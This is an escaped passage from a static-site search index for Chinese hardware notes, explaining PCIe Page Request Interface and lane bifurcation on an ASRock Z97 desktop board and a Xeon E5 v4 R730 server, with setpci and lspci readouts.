\u200b\u6807\u51c6\u200b\u8fd8\u200b\u5b9a\u4e49\u200b\u4e86\u200b\u4e00\u4e2a\u200b\u53ef\u200b\u9009\u200b\u529f\u80fd\u200b\uff0c\u200b\u5c31\u662f\u200b Page Request Interface\uff08PRI\uff09\uff0c\u200b\u5176\u5b9e\u200b\u5c31\u662f\u200b\u7f3a\u9875\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u8bbe\u5907\u200b\u53ef\u4ee5\u200b\u53bb\u200b\u53d1\u9001\u200b Page Request\uff0c\u200b\u8981\u6c42\u200b\u64cd\u4f5c\u7cfb\u7edf\u200b\u53bb\u200b\u5206\u914d\u200b\u4e00\u4e2a\u200b\u7269\u7406\u200b\u9875\u200b\u3002\u200b\u8fd9\u200b\u5c31\u200b\u50cf\u200b\u7528\u6237\u7a0b\u5e8f\u200b\u91cc\u200b mmap \u200b\u4e00\u4e2a\u200b\u533f\u540d\u200b\u7684\u200b\u9875\u200b\uff0c\u200b\u4e00\u200b\u5f00\u59cb\u200b\u662f\u200b\u6ca1\u6709\u200b\u5206\u914d\u200b\u7684\u200b\uff0c\u200b\u76f4\u5230\u200b\u7b2c\u4e00\u6b21\u200b\u8bbf\u95ee\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u51fa\u73b0\u200b\u7f3a\u9875\u200b\u5f02\u5e38\u200b\uff0c\u200b\u7136\u540e\u200b OS \u200b\u5206\u914d\u200b\u4e00\u4e2a\u200b\u7269\u7406\u200b\u9875\u200b\uff0c\u200b\u518d\u200b\u66f4\u65b0\u200b\u9875\u8868\u200b\u3002\u200b\u8fd9\u6837\u200b\u7684\u200b\u597d\u5904\u200b\u662f\u200b\u7528\u4e8e\u200b DMA \u200b\u7684\u200b\u7269\u7406\u200b\u9875\u200b\u4e5f\u200b\u53ef\u4ee5\u200b Swap \u200b\u6216\u8005\u200b\u5ef6\u8fdf\u200b\u5206\u914d\u200b\u3002</p>"},{"location":"hardware/pcie.html#bifurcation","title":"Bifurcation","text":"<p>PCIe Bifurcation \u200b\u7684\u200b\u76ee\u7684\u200b\u662f\u200b\u8ba9\u200b PCIe \u200b\u6709\u200b\u66f4\u597d\u200b\u7684\u200b\u7075\u6d3b\u6027\u200b\u3002\u200b\u4ece\u200b CPU \u200b\u51fa\u6765\u200b\u7684\u200b\u51e0\u8def\u200b PCIe\uff0c\u200b\u5b83\u200b\u7684\u200b\u5bbd\u5ea6\u200b\u4e00\u822c\u200b\u662f\u200b\u786e\u5b9a\u200b\u7684\u200b\uff0c\u200b\u6bd4\u5982\u200b\u6709\u200b\u4e00\u4e2a\u200b x16\uff0c\u200b\u4f46\u662f\u200b\u5b9e\u9645\u200b\u4f7f\u7528\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u60f3\u8981\u200b\u63a5\u200b\u591a\u4e2a\u200b\u8bbe\u5907\u200b\uff0c\u200b\u4f8b\u5982\u200b\u628a\u200b x16 \u200b\u5f53\u6210\u200b\u4e24\u4e2a\u200b x8 \u200b\u6765\u200b\u7528\u200b\uff0c\u200b\u8fd9\u200b\u5c31\u662f\u200b PCIe Bifurcation\u3002\u200b\u8fd9\u200b\u9700\u8981\u200b PCIe \u200b\u4e24\u7aef\u200b\u7684\u200b\u652f\u6301\u200b\uff0cCPU \u200b\u7aef\u200b\u9700\u8981\u200b\u53ef\u200b\u914d\u7f6e\u200b PCIe Bifurcation\uff0c\u200b\u4e0d\u7136\u200b\u53ea\u80fd\u200b\u4ece\u200b\u4e00\u4e2a\u200b x16 \u200b\u964d\u7ea7\u200b\u5230\u200b\u4e00\u4e2a\u200b x8\uff0c\u200b\u5269\u4e0b\u200b\u7684\u200b 8x \u200b\u5c31\u200b\u6ca1\u6cd5\u200b\u5229\u7528\u200b\u4e86\u200b\uff1b\u200b\u8bbe\u5907\u200b\u7aef\u200b\u9700\u8981\u200b\u62c6\u5206\u200b\u5361\u200b\uff0c\u200b\u628a\u200b x16 \u200b\u7684\u200b\u4fe1\u53f7\u200b\u5206\u6210\u200b\u4e24\u8def\u200b\uff0c\u200b\u7136\u540e\u200b\u63d0\u4f9b\u200b\u4e24\u4e2a\u200b PCIe \u200b\u63d2\u69fd\u200b\u4ee5\u53ca\u200b\u4f7f\u7528\u200b Clock Buffer \u200b\u6765\u200b\u63d0\u4f9b\u200b\u4e0b\u6e38\u200b\u8bbe\u5907\u200b\u7684\u200b\u65f6\u949f\u200b\uff0c\u200b\u6709\u65f6\u200b\u5219\u200b\u662f\u200b\u4e3b\u677f\u200b\u8bbe\u8ba1\u200b\u65f6\u200b\u5c31\u200b\u505a\u200b\u4e86\u200b\u62c6\u5206\u200b\uff0c\u200b\u4e0d\u200b\u9700\u8981\u200b\u989d\u5916\u200b\u7684\u200b\u62c6\u5206\u200b\u5361\u200b\u3002</p> <p>\u200b\u4e0b\u9762\u200b\u5206\u522b\u200b\u4ece\u200b\u684c\u9762\u200b\u5e73\u53f0\u200b\u548c\u200b\u670d\u52a1\u5668\u200b\u5e73\u53f0\u200b\uff0c\u200b\u7814\u7a76\u200b PCIe Bifurcation \u200b\u662f\u200b\u5982\u4f55\u200b\u914d\u7f6e\u200b\u7684\u200b\u3002</p>"},{"location":"hardware/pcie.html#_6","title":"\u684c\u9762\u200b\u5e73\u53f0","text":"<p>\u200b\u5728\u200b\u684c\u9762\u200b\u5e73\u53f0\u200b\u4e0a\u200b\uff0cIntel CPU \u200b\u4f1a\u200b\u6839\u636e\u200b\u542f\u52a8\u200b\u65f6\u200b CFG \u200b\u5f15\u811a\u200b\u7684\u200b\u503c\u6765\u200b\u51b3\u5b9a\u200b PCIe Bifurcation \u200b\u8bbe\u7f6e\u200b\u3002CFG \u200b\u7684\u200b\u503c\u200b\u4e0e\u200b PCIe Bifurcation \u200b\u7684\u200b\u5bf9\u5e94\u200b\u5173\u7cfb\u200b\u53ef\u4ee5\u200b\u4ece\u200b Datasheet \u200b\u4e2d\u200b\u627e\u5230\u200b\u3002</p> <p>\u200b\u5b9e\u9645\u200b\u627e\u200b\u4e00\u4e2a\u200b\u4e3b\u677f\u200b\u6765\u200b\u7814\u7a76\u200b\u4e00\u4e0b\u200b\u3002\u200b\u578b\u53f7\u200b\u662f\u200b ASRock Fatal1ty Z97X Killer\uff0c\u200b\u4ece\u200b\u4e3b\u677f\u200b\u7684\u200b\u63cf\u8ff0\u200b\u4e2d\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\uff1a<code>3 x PCI Express 3.0 x16 Slots (PCIE2/PCIE4/PCIE6: single at x16 (PCIE2); dual at x8 (PCIE2) / x8 (PCIE4); triple at x8 (PCIE2) / x4 (PCIE4) / x4 (PCIE6)</code>\uff0c\u200b\u8bf4\u660e\u200b\u5b83\u200b\u662f\u200b\u652f\u6301\u200b PCIe Bifurcation \u200b\u7684\u200b\uff0c\u200b\u6d89\u53ca\u200b\u5230\u200b\u4e09\u4e2a\u200b PCIe Slot\uff0c\u200b\u652f\u6301\u200b\u4e09\u79cd\u200b\u6a21\u5f0f\u200b\uff1a</p> <ul> <li>PCIE2 Slot x16</li> <li>PCIE2 Slot x8, PCIE4 Slot x8</li> <li>PCIE2 Slot x8, PCIE4 Slot x4, PCIE6 Slot x4</li> </ul> <p>\u200b\u5728\u200b \u200b\u7f51\u4e0a\u200b \u200b\u627e\u5230\u200b\u8be5\u200b\u4e3b\u677f\u200b\u7684\u200b \u200b\u539f\u7406\u56fe\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u7528\u200b OpenBoardView \u200b\u8f6f\u4ef6\u200b\u6253\u5f00\u200b\u3002\u200b\u8fd9\u4e2a\u200b\u4e3b\u677f\u200b\u4e0a\u200b\u7684\u200b CPU \u200b\u63d2\u69fd\u200b\u662f\u200b LGA1150\uff0c\u200b\u627e\u5230\u200b\u4e00\u4e2a\u200b\u517c\u5bb9\u200b\u7684\u200b CPU \u200b\u7248\u672c\u200b i7-4771\uff0c\u200b\u4e0b\u8f7d\u200b Datasheet\uff0c\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\u51b3\u5b9a\u200b PCIe Bifurcation \u200b\u7684\u200b\u5f15\u811a\u200b\u662f\u200b <code>CFG[6:5]</code>\uff1a</p> <ul> <li><code>CFG[6:5]=00</code>: 1x8, 2x4</li> <li><code>CFG[6:5]=10</code>: 2x8</li> <li><code>CFG[6:5]=11</code>: 1x16</li> </ul> <p>\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\uff0c\u200b\u8fd9\u200b\u4e09\u79cd\u200b\u914d\u7f6e\u200b\u548c\u200b\u4e3b\u677f\u200b\u7f51\u7ad9\u200b\u4e0a\u200b\u63cf\u8ff0\u200b\u7684\u200b\u662f\u200b\u4e00\u81f4\u200b\u7684\u200b\u3002\u200b\u65e2\u7136\u200b\u4e3b\u677f\u200b\u652f\u6301\u200b Bifurcation\uff0c\u200b\u8bf4\u660e\u200b\u4e00\u5b9a\u200b\u6709\u200b\u529e\u6cd5\u200b\u8bbe\u7f6e\u200b <code>CFG[6:5]</code> \u200b\u4e3a\u200b\u4ee5\u4e0a\u200b\u4e09\u79cd\u200b\u53d6\u503c\u200b\u3002</p> <p>\u200b\u63a5\u4e0b\u6765\u200b\uff0c\u200b\u8981\u200b\u627e\u5230\u200b\u4e3b\u677f\u200b\u4e0a\u200b\u600e\u4e48\u200b\u8fde\u63a5\u200b <code>CFG[6:5]</code>\u3002\u200b\u5728\u200b\u539f\u7406\u56fe\u200b\u4e2d\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u627e\u5230\u200b LGA1150 \u200b\u7684\u200b <code>U39 CPU_CFG5</code> \u200b\u548c\u200b <code>U40 V_CFG6</code>\uff0c\u200b\u7ee7\u7eed\u200b\u5f80\u4e0b\u200b\u627e\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\u5b83\u4eec\u200b\u901a\u8fc7\u200b\u7535\u963b\u200b\u8fde\u5230\u200b\u4e86\u200b\u540c\u4e00\u4e2a\u200b BAT54C \u200b\u82af\u7247\u200b\u4e0a\u200b\uff0c\u200b\u6240\u4ee5\u200b\u53ea\u200b\u9700\u8981\u200b\u770b\u200b BAT54C \u200b\u7b2c\u4e09\u4e2a\u200b\u5f15\u811a\u200b N105955695 \u200b\u7684\u200b\u7535\u5e73\u200b\u3002N105955695 \u200b\u63a5\u5230\u200b\u4e86\u200b\u4e00\u4e2a\u200b 2N7002BKS \u200b\u82af\u7247\u200b\u4e0a\u200b\uff0c\u200b\u6839\u636e\u200b\u7535\u8def\u56fe\u200b\uff0c\u200b\u6700\u540e\u200b\u662f\u200b\u8981\u200b\u770b\u200b <code>X4_PRSNT1#</code> \u200b\u4fe1\u53f7\u200b\u3002</p> <p><code>X4_PRSTN1#</code> \u200b\u4fe1\u53f7\u200b\u8fde\u63a5\u200b\u5230\u200b\u4e86\u200b PCIE6 \u200b\u4e0a\u200b\uff0c\u200b\u5982\u679c\u200b PCIE6 Slot \u200b\u63d2\u5165\u200b\u4e86\u200b\u8bbe\u5907\u200b\uff0c\u200b\u90a3\u4e48\u200b <code>X4_PRSTN1#</code> \u200b\u4fe1\u53f7\u200b\u751f\u6548\u200b\uff0c\u200b\u6839\u636e\u200b\u5206\u6790\u200b\u51fa\u6765\u200b\u7684\u200b\u7535\u8def\u200b\uff0c\u200b\u5b83\u4f1a\u200b\u4f7f\u5f97\u200b <code>CFG[6:0]</code> \u200b\u53d8\u4e3a\u200b 00\uff0c\u200b\u5bf9\u5e94\u200b 1x8+2x4 \u200b\u7684\u200b Bifurcation \u200b\u6a21\u5f0f\u200b\u3002\u200b\u56de\u60f3\u200b\u4e00\u4e0b\u200b\uff0c\u200b\u5728\u200b\u4e3b\u677f\u200b\u652f\u6301\u200b\u7684\u200b\u4e09\u79cd\u200b PCIe Bifurcation \u200b\u6a21\u5f0f\u200b\u4e0b\u200b\uff0c\u200b\u53ea\u6709\u200b\u8fd9\u200b\u4e00\u79cd\u200b\u6d89\u53ca\u200b\u5230\u200b\u4e86\u200b PCIE6 Slot\u3002\u200b\u6240\u4ee5\u200b\u5982\u679c\u200b\u7528\u6237\u200b\u5728\u200b PCIE6 Slot \u200b\u63d2\u5165\u200b\u4e86\u200b\u8bbe\u5907\u200b\uff0c\u200b\u90a3\u200b\u8bf4\u660e\u200b\u7528\u6237\u200b\u9700\u8981\u200b\u7684\u200b\u662f\u200b 1x8+2x4 \u200b\u7684\u200b\u6a21\u5f0f\u200b\uff0c\u200b\u81ea\u52a8\u200b\u914d\u7f6e\u200b CPU \u200b\u7684\u200b <code>CFG[6:5]</code> \u200b\u4fe1\u53f7\u200b\u4e3a\u200b\u9884\u671f\u200b\u503c\u200b\u3002</p> <p>\u200b\u53e6\u4e00\u65b9\u9762\u200b\uff0c\u200b\u8bbe\u7f6e\u200b <code>CFG[6:5]</code> \u200b\u8fd8\u200b\u4e0d\u591f\u200b\uff0c\u200b\u4e0a\u9762\u200b\u63d0\u5230\u200b\u8fc7\u200b\uff0c\u200b\u4e3b\u677f\u200b\u9700\u8981\u200b\u8d1f\u8d23\u200b\u628a\u200b PCIE2/4/6 \u200b\u7684\u200b\u4fe1\u53f7\u200b\u8fde\u63a5\u200b\u5230\u200b\u539f\u6765\u200b\u7684\u200b\u5b8c\u6574\u200b\u7684\u200b x16 \u200b\u4e0a\u200b\uff0c\u200b\u5e76\u4e14\u200b\u6839\u636e\u200b\u5b9e\u9645\u200b\u60c5\u51b5\u200b\u8fde\u63a5\u200b\u4e0d\u540c\u200b\u7684\u200b\u7ebf\u200b\u3002\u200b\u5177\u4f53\u200b\u7684\u200b\u5b9e\u73b0\u200b\u65b9\u5f0f\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u5728\u200b\u539f\u7406\u56fe\u200b\u4e2d\u200b\u627e\u5230\u200b\uff1a\u200b\u4fe1\u53f7\u200b <code>X4_PRSTN1#</code> \u200b\u8fde\u63a5\u200b\u5230\u200b\u4e86\u200b CBTL04083BBS\uff0c\u200b\u8fd9\u662f\u200b\u4e00\u4e2a\u200b PCIe Mux/Demux \u200b\u82af\u7247\u200b\uff0c\u200b\u4e5f\u200b\u5c31\u662f\u200b\u628a\u200b\u540c\u6837\u200b\u4e00\u7ec4\u200b\u5dee\u5206\u200b\u7ebf\u8fde\u5230\u200b\u4e0d\u540c\u200b PCIe Slot \u200b\u4e0a\u200b\u6240\u200b\u9700\u8981\u200b\u7684\u200b\u82af\u7247\u200b\u3002</p> <p>\u200b\u4e8e\u662f\u200b\u76ee\u524d\u200b\u63a8\u65ad\u51fa\u200b\u4e86\u200b\u4e00\u90e8\u5206\u200b\u7684\u200b\u5de5\u4f5c\u200b\u539f\u7406\u200b\uff1a\u200b\u7528\u6237\u200b\u5728\u200b PCIE6 Slot \u200b\u63d2\u5165\u200b\u8bbe\u5907\u200b\uff0c\u200b\u7535\u8def\u200b\u8ba1\u7b97\u200b\u51fa\u200b <code>CFG[6:5]=00</code>\uff0c\u200b\u540c\u65f6\u200b\u914d\u7f6e\u200b\u597d\u200b\u4e86\u200b PCIe Mux/Demux \u200b\u82af\u7247\u200b\uff0c\u200b\u628a\u200b 1x16 \u200b\u5207\u200b\u5206\u4e3a\u200b 1x8+2x4\u3002</p> <p>\u200b\u7ee7\u7eed\u200b\u5f80\u4e0b\u200b\u770b\u200b\uff0c\u200b\u4e3b\u677f\u200b\u5982\u4f55\u200b\u5b9e\u73b0\u200b\u5269\u4e0b\u200b\u4e24\u79cd\u200b\u914d\u7f6e\u200b\uff1a<code>CFG[6:5]=10</code> \u200b\u5bf9\u5e94\u200b 2x8\uff0c<code>CFG[6:5]=11</code> \u200b\u5bf9\u5e94\u200b 1x16\u3002\u200b\u8fd9\u200b\u4e24\u79cd\u200b\u7f16\u7801\u200b\u91cc\u200b\uff0cCFG6 \u200b\u90fd\u200b\u4e3a\u200b 1\uff0c\u200b\u53ea\u200b\u9700\u8981\u200b\u8003\u8651\u200b\u5982\u4f55\u200b\u5904\u7406\u200b CFG5\u3002CFG5 \u200b\u9664\u4e86\u200b\u8fde\u63a5\u200b\u4e0a\u9762\u200b\u63d0\u5230\u200b\u7684\u200b BAT54C \u200b\u4ee5\u5916\u200b\uff0c\u200b\u8fd8\u200b\u901a\u8fc7\u200b\u53e6\u200b\u4e00\u4e2a\u200b 2N7002BKS \u200b\u82af\u7247\u200b\u8fde\u63a5\u200b\u5230\u200b\u4e86\u200b <code>NB_X8_PRSENT#</code> \u200b\u4fe1\u53f7\u200b\u4e0a\u200b\u3002\u200b\u5982\u679c\u200b\u4f60\u200b\u60f3\u200b\u660e\u767d\u200b\u4e86\u200b\u524d\u9762\u200b\u7684\u200b\u8fc7\u7a0b\u200b\uff0c\u200b\u5e94\u8be5\u200b\u53ef\u4ee5\u200b\u63a8\u65ad\u200b\u51fa\u6765\u200b\uff0c\u200b\u8fd9\u91cc\u200b\u7684\u200b <code>NB_X8_PRSENT#</code> \u200b\u8fde\u63a5\u200b\u5230\u200b\u4e86\u200b PCIE4 Slot \u200b\u4e0a\u200b\u3002\u200b\u5f53\u200b PCIE4 Slot \u200b\u63d2\u5165\u200b\u4e86\u200b\u8bbe\u5907\u200b\uff0c\u200b\u540c\u65f6\u200b PCIE6 Slot \u200b\u6ca1\u6709\u200b\u63d2\u5165\u200b\u8bbe\u5907\u200b\uff0c\u200b\u90a3\u4e48\u200b\u6839\u636e\u200b\u76f8\u5e94\u200b\u7684\u200b PRESENT \u200b\u4fe1\u53f7\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u5f97\u5230\u200b <code>CFG[6:5]=10</code>\u3002\u200b\u5982\u679c\u200b PCIE4 Slot \u200b\u548c\u200b PCIE6 Slot \u200b\u90fd\u200b\u6ca1\u6709\u200b\u63d2\u5165\u200b\u8bbe\u5907\u200b\uff0c\u200b\u90a3\u200b\u5c31\u200b <code>CFG[6:5]=11</code>\u3002</p> <p>\u200b\u603b\u7ed3\u200b\u4e00\u4e0b\u200b\uff0c\u200b\u52a8\u6001\u200b\u68c0\u6d4b\u200b\u5e76\u200b\u8ba1\u7b97\u200b\u51fa\u200b <code>CFG[6:5]</code> \u200b\u7684\u200b\u903b\u8f91\u200b\uff1a</p> <ol> <li>\u200b\u5982\u679c\u200b PCIE6 Slot \u200b\u63d2\u5165\u200b\u4e86\u200b\u8bbe\u5907\u200b\uff0c\u200b\u8bf4\u660e\u200b\u8981\u200b\u914d\u7f6e\u200b\u4e3a\u200b 1x8+2x4\uff0c\u200b\u8bbe\u7f6e\u200b <code>CFG[6:5]=00</code></li> <li>\u200b\u5426\u5219\u200b\uff0c\u200b\u5982\u679c\u200b PCIE4 Slot \u200b\u63d2\u5165\u200b\u4e86\u200b\u8bbe\u5907\u200b\uff0c\u200b\u8bf4\u660e\u200b\u8981\u200b\u914d\u7f6e\u200b\u4e3a\u200b 2x8\uff0c\u200b\u8bbe\u7f6e\u200b <code>CFG[6:5]=10</code></li> <li>\u200b\u5426\u5219\u200b\uff0c\u200b\u8bf4\u660e\u200b\u8981\u200b\u914d\u7f6e\u200b\u4e3a\u200b 1x16\uff0c\u200b\u8bbe\u7f6e\u200b <code>CFG[6:5]=11</code></li> </ol> <p>\u200b\u800c\u200b\u4e3b\u677f\u200b\u8bbe\u8ba1\u8005\u200b\u5c31\u662f\u200b\u8981\u200b\u628a\u200b\u8fd9\u4e2a\u200b\u903b\u8f91\u200b\u8f6c\u5316\u200b\u4e3a\u200b\u7535\u8def\u200b\uff0c\u200b\u7528\u200b BAT54C \u200b\u548c\u200b CBTL04083BBS \u200b\u82af\u7247\u200b\u6765\u200b\u5b9e\u73b0\u200b\u903b\u8f91\u8fd0\u7b97\u200b\u3002</p> <p>\u200b\u987a\u4fbf\u200b\u4e00\u63d0\u200b\uff0c\u200b\u8fd9\u91cc\u200b\u7684\u200b PCIE2/4/6 \u200b\u7269\u7406\u200b\u5c3a\u5bf8\u200b\u90fd\u200b\u662f\u200b x16\uff0c\u200b\u53ea\u4e0d\u8fc7\u200b\u5b9e\u9645\u200b\u5206\u914d\u200b\u5230\u200b\u7684\u200b\u5bbd\u5ea6\u200b\u4e0d\u200b\u4e00\u5b9a\u200b\u4e0e\u200b\u7269\u7406\u200b\u5c3a\u5bf8\u200b\u4e00\u81f4\u200b\u3002</p>"},{"location":"hardware/pcie.html#_7","title":"\u670d\u52a1\u5668\u200b\u5e73\u53f0","text":"<p>\u200b\u5728\u200b\u670d\u52a1\u5668\u200b\u5e73\u53f0\u200b\u4e0a\u200b\uff0cIntel CPU \u200b\u7684\u200b Bifurcation \u200b\u53d8\u6210\u200b\u8fd0\u884c\u200b\u65f6\u200b\u53ef\u200b\u914d\u7f6e\u200b\u7684\u200b\uff0c\u200b\u4f8b\u5982\u200b\u5728\u200b Xeon E5 v4 Datasheet Volume 2 \u200b\u4e2d\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u627e\u5230\u200b\u5bc4\u5b58\u5668\u200b <code>pcie_iou_bif_ctrl</code> \u200b\u5bc4\u5b58\u5668\u200b\u7684\u200b\u5b9a\u4e49\u200b\uff1a</p> <p> </p> PCIe Bifurcation \u200b\u914d\u7f6e\u200b\u65b9\u5f0f\u200b\uff08\u200b\u56fe\u6e90\u200b Xeon E5 v4 Datasheet Volume 2\uff09 <p>\u200b\u8fd9\u4e2a\u200b\u5bc4\u5b58\u5668\u200b\u5728\u200b PCIe \u200b\u914d\u7f6e\u200b\u7a7a\u95f4\u200b\u4e2d\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u901a\u8fc7\u200b <code>setpci</code> \u200b\u547d\u4ee4\u200b\u6765\u200b\u8bfb\u53d6\u200b\u6216\u200b\u5199\u5165\u200b\uff1a</p> <pre><code>$ setpci -s 00:00.0 190.B\n00\n$ setpci -s 00:01.0 190.B\n01 # x8\n$ setpci -s 00:02.0 190.B\n04 # x16\n$ setpci -s 00:03.0 190.B\n03 # x8x8\n$ setpci -s 80:02.0 190.B\n04 # x16\n</code></pre> <p>\u200b\u901a\u8fc7\u200b <code>lspci -bPP</code> \u200b\u547d\u4ee4\u200b\u4ee5\u53ca\u200b <code>lspci -vvv</code>\uff0c\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\u5728\u200b\u8fd9\u200b\u51e0\u4e2a\u200b PCIe Root Port \u200b\u4e0b\u200b\u7684\u200b\u8bbe\u5907\u200b\u4ee5\u53ca\u200b\u901f\u5ea6\u200b\uff1a</p> <ul> <li>00:01.0(x8)/02:00.0 RAID \u200b\u63a7\u5236\u5668\u200b PCIe 3.0 x8</li> <li>00:02.0(x16)/03:00.0 NVIDIA \u200b\u663e\u5361\u200b PCIe 3.0 x16</li> <li>00:03.0(x8x8)/01:00.0 BCM 2x10G+2x1G \u200b\u7f51\u5361\u200b PCIe 2.0 x8</li> <li>80:02.0(x16)/82:00.0 NVIDIA \u200b\u663e\u5361\u200b PCIe 3.0 x16</li> </ul> <p>\u200b\u5176\u4e2d\u200b\u524d\u200b\u4e09\u4e2a\u200b\u8bbe\u5907\u200b\u8fde\u63a5\u200b\u5230\u200b CPU1\uff0c\u200b\u540e\u200b\u4e09\u4e2a\u200b\u8bbe\u5907\u200b\u8fde\u63a5\u200b\u5230\u200b CPU2</p> <p>\u200b\u5728\u200b BIOS \u200b\u8bbe\u7f6e\u200b\u4e2d\u200b\uff0c\u200b\u8fdb\u5165\u200b Integrated Devices -&gt; Slot Bifurcation \u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\u8bbe\u7f6e\u200b\uff0c\u200b\u53ef\u9009\u9879\u200b\u6709\u200b\uff1a</p> <ul> <li>Slot 1/2/3/5: Default Bifurcation, x4+x4 Bifurcation</li> <li>Slot 4/6: Default Bifurcation, x4+x4+x4+x4 Bifurcation, x8+x8 Bifurcation</li> </ul> <p>\u200b\u9605\u8bfb\u200b R730 \u200b\u6587\u6863\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u53d1\u73b0\u200b\u5b83\u200b\u6700\u200b\u591a\u200b\u53ef\u4ee5\u200b\u6709\u200b 7 \u200b\u4e2a\u200b Slot\uff0c\u200b\u5176\u4e2d\u200b Slot 1/2/3/5/7 \u200b\u662f\u200b PCIe 3.0x8\uff0cSlot 4 \u200b\u662f\u200b PCIe 3.0 x16\uff0cSlot 6 \u200b\u6839\u636e\u200b\u4e0d\u540c\u200b\u7684\u200b Riser \u200b\u53ef\u4ee5\u200b\u63d0\u4f9b\u200b PCIe 3.0 x8 \u200b\u6216\u200b x16\uff0c\u200b\u5bf9\u5e94\u200b\u5173\u7cfb\u200b\u5982\u4e0b\u200b\uff1a</p> <ul> <li>PCIe Slot 1: x8, CPU2</li> <li>PCIe Slot 2: x8, CPU2</li> <li>PCIe Slot 3: x8, CPU2</li> <li>PCIe Slot 4: x16, CPU2</li> <li>PCIe Slot 5: x8, CPU1</li> <li>PCIe Slot 6: x8/x16, CPU1</li> <li>PCIe Slot 7: x8, CPU1</li> </ul> <p>\u200b\u9605\u8bfb\u200b E5 v4 CPU \u200b\u6587\u6863\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u53d1\u73b0\u200b\u5b83\u200b\u6709\u200b\u4e09\u4e2a\u200b PCIe Port\uff0c\u200b\u4e00\u5171\u200b\u6709\u200b 40 PCIe lanes\uff08x8+x16+x16\uff09\u3002\u200b\u7531\u6b64\u53ef\u77e5\u200b\uff0c\u200b\u5176\u4e2d\u200b\u4e00\u4e2a\u200b x16 \u200b\u8fde\u63a5\u200b\u5230\u200b Slot4/6 \u200b\u4e0a\u200b\uff0c\u200b\u53e6\u200b\u4e00\u4e2a\u200b x16 \u200b\u62c6\u200b\u5206\u6210\u200b x8+x8\uff0c\u200b\u8fde\u63a5\u200b\u5230\u200b\u5176\u4f59\u200b\u7684\u200b Slot\u3002\u200b\u6709\u4e9b\u200b\u5947\u602a\u7684\u662f\u200b CPU1 \u200b\u5c11\u200b\u4e86\u200b\u4e00\u4e2a\u200b x8 \u200b\u4e0d\u77e5\u53bb\u5411\u200b\uff0c\u200b\u6000\u7591\u200b\u662f\u200b\u8fde\u63a5\u200b\u5230\u200b\u4e86\u200b RAID \u200b\u5361\u200b\u6216\u8005\u200b\u7f51\u5361\u200b\u4e0a\u200b\u3002\u200b\u7531\u4e8e\u200b\u7f3a\u5c11\u200b\u4e3b\u677f\u200b\u7684\u200b\u539f\u7406\u56fe\u200b\uff0c\u200b\u65e0\u6cd5\u200b\u7ee7\u7eed\u200b\u6df1\u5165\u7814\u7a76\u200b\u3002</p> <p>\u200b\u9057\u61be\u200b\u7684\u200b\u662f\u200b\uff0c\u200b\u8fd9\u4e2a\u200b\u5bc4\u5b58\u5668\u200b\u7684\u200b <code>iou_start_bifurcation</code> \u200b\u5b57\u200b\u6bb5\u200b\u53ea\u80fd\u200b\u5199\u5165\u200b\u4e00\u6b21\u200b 1 \u200b\u6765\u200b\u521d\u59cb\u5316\u200b Bifurcation\uff0c\u200b\u800c\u200b\u8fd9\u200b\u4e00\u822c\u200b\u662f\u200b\u7531\u200b BIOS \u200b\u5b8c\u6210\u200b\u7684\u200b\u3002\u200b\u5982\u679c\u200b BIOS \u200b\u6ca1\u6709\u200b\u505a\u200b\uff0c\u200b\u6216\u8bb8\u200b\u53ef\u4ee5\u200b\u540e\u9762\u200b\u518d\u200b\u5199\u5165\u200b\u4e00\u6b21\u200b\uff1b\u200b\u5982\u679c\u200b BIOS \u200b\u5df2\u7ecf\u200b\u5199\u5165\u200b\u4e86\u200b\uff0c\u200b\u4f46\u662f\u200b\u6ca1\u6709\u200b\u63d0\u4f9b\u200b\u53ef\u9009\u9879\u200b\uff0c\u200b\u90a3\u4e48\u200b\u53ef\u4ee5\u200b\u8003\u8651\u200b\u9006\u5411\u200b BIOS\uff0c\u200b\u4f7f\u7528\u200b UEFITool \u200b\u67e5\u770b\u200b\u662f\u5426\u200b\u6709\u200b\u9690\u85cf\u200b\u7684\u200b\u914d\u7f6e\u200b\uff0c\u200b\u5982\u679c\u200b\u6709\u200b\uff0c\u200b\u5219\u200b\u53ef\u4ee5\u200b\u5c1d\u8bd5\u200b\u7ed5\u8fc7\u200b BIOS \u200b\u8bbe\u7f6e\u200b\u53bb\u200b\u4fee\u6539\u200b\u9690\u85cf\u200b\u7684\u200b\u914d\u7f6e\u200b\uff0c\u200b\u5982\u679c\u200b\u6ca1\u6709\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u8003\u8651\u200b\u4fee\u6539\u200b BIOS \u200b\u7684\u200b\u6307\u4ee4\u200b\u3002</p>"},{"location":"hardware/pcie.html#_8","title":"\u5c0f\u7ed3","text":"<p>\u200b\u7b80\u5355\u200b\u603b\u7ed3\u200b\u4e00\u4e0b\u200b\uff0cPCIe Bifurcation \u200b\u7684\u200b\u76ee\u7684\u200b\u662f\u200b\u4fdd\u8bc1\u200b\u603b\u200b lane \u200b\u6570\u200b\u4e0d\u53d8\u200b\u7684\u200b\u60c5\u51b5\u200b\u4e0b\u200b\uff0c\u200b\u8fde\u63a5\u200b\u66f4\u200b\u591a\u200b\u8bbe\u5907\u200b\u7684\u200b\u8f83\u200b\u4f4e\u6210\u672c\u200b\u7684\u200b\u65b9\u6cd5\u200b\u3002\u200b\u5b83\u200b\u9700\u8981\u200b CPU \u200b\u4e00\u4fa7\u200b\u548c\u200b\u8bbe\u5907\u200b\u4e00\u4fa7\u200b\u7684\u200b\u652f\u6301\u200b\u3002\u200b\u684c\u9762\u200b\u7ea7\u522b\u200b\u7684\u200b CPU \u200b\u901a\u8fc7\u200b CFG \u200b\u4fe1\u53f7\u200b\u6765\u200b\u914d\u7f6e\u200b\uff0c\u200b\u670d\u52a1\u5668\u7aef\u200b\u7684\u200b CPU 